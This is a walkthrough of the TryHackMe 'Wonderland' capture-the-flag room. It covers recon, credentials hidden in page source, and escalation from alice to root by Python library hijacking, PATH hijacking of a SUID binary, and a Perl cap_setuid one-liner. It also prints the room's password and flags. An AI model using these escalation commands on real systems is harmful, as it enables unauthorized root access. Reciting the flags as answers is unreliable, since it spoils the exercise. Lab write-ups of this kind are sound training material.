# Wonderland — TryHackMe Walkthrough

**Difficulty:** Medium  
**Goal:** Capture both `user.txt` and `root.txt`.

---

## 1. Reconnaissance

The initial step involved scanning the target machine to identify active services and their respective versions.

**Command:**  
```bash
nmap -Pn -sV -sS -sC <ip>
```

**Flag breakdown:**
* `-Pn` — Disables host pinging to save time.
* `-sV` — Detects service versions.
* `-sC` — Runs default nmap scripts.
* `-sS` — Performs a stealthy SYN scan.

**Result:**
```text
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu  
80/tcp open  http    Golang net/http server
```
The scan revealed only two open ports: standard SSH and a Go-based web server.

---

## 2. Web Enumeration

Visiting the root page of the web server showed no functional elements, except for a line of text advising to "follow the white rabbit."

By brute-forcing directories and following the hint literally, it became clear that the letters of the word **rabbit** needed to be appended as subdirectories. This led to the following URL:  
`http://<ip>/r/a/b/b/i/t/`

Checking the page source code (`Ctrl + U`) on this hidden page revealed cleartext credentials hidden inside the HTML body. These credentials turned out to belong to the user **alice**.

---

## 3. Initial Access (SSH as alice)

Using the discovered credentials, I established an SSH connection to the machine:
```bash
ssh alice@<ip>
```

Listing the files in Alice's home directory showed `root.txt`, but it was unreadable due to strict root-only permissions. The room description hinted that "everything is upside down." Following this logic, the user flag (`user.txt`) was located in the root directory rather than the user's home folder.

**Capturing the user flag:**
```bash
cat /root/user.txt
```

---

## 4. Privilege Escalation

### Step 1: Enumerate Sudo Permissions
Checking allowed sudo commands for the current user:
```bash
sudo -l
```
The output stated that Alice can execute a specific Python script as the user **rabbit** without a password:
```text
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
The script simply imports the standard `random` library (`import random`) and prints lines of poetry. This import statement is the primary attack vector.

### Step 2: Python Library Hijacking (alice -> rabbit)
When Python imports a module, it looks into the current working directory before searching system paths. Creating a custom file named `random.py` in the same directory forces the script to execute our code instead of the legitimate library.

Create the malicious `random.py` file:
```bash
nano /home/alice/random.py
```
Insert the payload to trigger a shell execution:
```python
import os
os.system("/bin/bash")
```
Run the allowed script as `rabbit`:
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
The Python interpreter runs our hijacked script, dropping us into a shell as the user `rabbit`.

### Step 3: Analyzing the teaParty SUID Binary (rabbit -> hatter)
Navigating to the home folder of the new user:
```bash
cd /home/rabbit && ls -la
```
The directory contains a binary named `teaParty` with the SUID bit set (indicated by the `s` flag in file permissions), meaning it executes with root privileges.

Running the binary outputs a greeting message along with the current date, then crashes with a `Segmentation fault`. To analyze the embedded strings inside the binary, I used the `strings` command:
```bash
strings teaParty
```
Among the output lines, the binary executes a system call to fetch the date:
```text
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
The application calls the `date` command natively without using its absolute path (e.g., `/bin/date`). This makes it look for the execution binary across the directories specified in the environmental `$PATH` variable.

### Step 4: PATH Hijacking (rabbit -> hatter)
By creating a custom script named `date` that launches a terminal, and appending its location to the beginning of the `$PATH` variable, we can force the SUID application to run our script instead of the real system utility.

Create the malicious `date` file inside rabbit's home directory:
```bash
echo "/bin/bash" > /home/rabbit/date
chmod +x /home/rabbit/date
```
Prepend the current directory to the `$PATH` environment variable:
```bash
export PATH=/home/rabbit:$PATH
```
Run the `teaParty` binary again:
```bash
./teaParty
```
The program triggers the `date` call, intercepts our local executable, and grants access as the user **hatter**.

### Step 5: Retrieving Hatter's Password
Check the home folder of the hatter user to find a cleartext password:
```bash
cd /home/hatter && cat password.txt
```
**Password:** `WhyIsARavenLikeAWritingDesk?`  
For stability and interface convenience, re-establish an SSH session directly as `hatter`.

### Step 6: Linux Capabilities Exploitation (hatter -> root)
Linux capabilities allow fine-grained privilege management instead of granting full root access. Checking files with active capabilities configured:
```bash
getcap -r / 2>/dev/null
```
The output revealed an interesting configuration on the `perl` binary:
```text
/usr/bin/perl5.26.1 = cap_setuid+ep  
/usr/bin/perl = cap_setuid+ep
```
The `cap_setuid` flag means the `perl` execution environment is permitted to manipulate user IDs on the fly. Referencing the GTFOBins database, we can run a brief Perl line to change our current UID to 0 (root) and spawn a root terminal:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'
```
Running `id` confirms that the active shell has full **root** administrative rights.

---

## 5. Capturing the Root Flag

Since the root flag was placed inversely inside Alice's home folder, we can now access and view its content.

```bash
cat /home/alice/root.txt
```
**Flag:** `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}`

